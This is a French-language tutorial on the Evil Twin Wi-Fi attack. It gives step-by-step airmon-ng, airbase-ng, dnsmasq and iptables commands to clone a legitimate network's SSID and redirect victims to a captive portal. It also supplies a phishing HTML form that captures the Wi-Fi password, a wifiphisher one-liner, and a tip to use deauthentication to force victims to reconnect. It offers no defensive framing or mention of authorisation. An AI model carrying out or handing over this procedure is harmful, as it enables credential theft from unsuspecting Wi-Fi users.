# Introduction a l'attaque Evil Twin en cybersécurité Wi-Fi

### 1. Qu'est-ce qu'une attaque Evil Twin ?

L'attaque Evil Twin consiste a creer un faux point d'acces Wi-Fi avec le meme nom (SSID) qu'un reseau legitime.
Les victimes se connectent a ce faux reseau pensant quil est authentique.
Le pirate redirige alors leur navigation vers une fausse page web (portail captif) qui demande le mot de passe Wi-Fi.
Une fois ce mot saisi, il est recupere par l'attaquant.

Ce type dattaque combine ingenierie sociale et techniques reseau.

### 2. Objectif et Pre-requis

**Objectif :** Pieger un utilisateur pour quil entre manuellement son mot de passe Wi-Fi.

**Pre-requis :**
- Une carte reseau supportant le mode moniteur et l'injection de paquets
- Un systeme Linux (Kali, Parrot, Zorin avec outils)
- Logiciels : airbase-ng, dnsmasq, iptables, serveur web (Apache ou Python HTTP)

### 3. Etapes de l'attaque Evil Twin

1. **Activer le mode moniteur :**
   ```bash
   airmon-ng start wlan0
   ```

2. **Creer le faux point d'acces :**
   ```bash
   airbase-ng -e "Nom_Du_WiFi" -c 6 wlan0mon
   ```

3. **Configuration reseau :**
   ```bash
   ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
   ```

4. **Configurer un faux serveur DHCP/DNS :**
   ```bash
   dnsmasq -C dnsmasq.conf
   ```

5. **Rediriger le trafic HTTP :**
   ```bash
   iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 10.0.0.1:80
   ```

6. **Heberger une fausse page de connexion :**
   ```bash
   service apache2 start
   # ou
   python3 -m http.server 80
   ```

7. **Capturer les identifiants saisis** (dans save.php ou log.txt)

### 4. Exemple de fichier dnsmasq.conf

```ini
interface=at0
dhcp-range=10.0.0.10,10.0.0.50,12h
address=/#/10.0.0.1
```

### 5. Exemple de page HTML de phishing

```html
<form action='save.php' method='POST'>
 <label>Mot de passe Wi-Fi :</label>
 <input type='password' name='pass'>
 <input type='submit' value='Connexion'>
</form>
```

### 6. Outils alternatifs

- wifiphisher : Automatisation complete de lattaque Evil Twin
- hostapd + dnsmasq : methode manuelle plus flexible

**Commandes rapides :**
```bash
wifiphisher -aI wlan0 -jI wlan1
```

### 7. Limitations de l'attaque

- Inefficace si aucun utilisateur ne se connecte au faux reseau
- Lutilisateur peut se douter de la supercherie
- HTTPS peut bloquer lacces au portail captif

**Astuce :** utiliser des techniques de desauthentification pour forcer une reconnexion
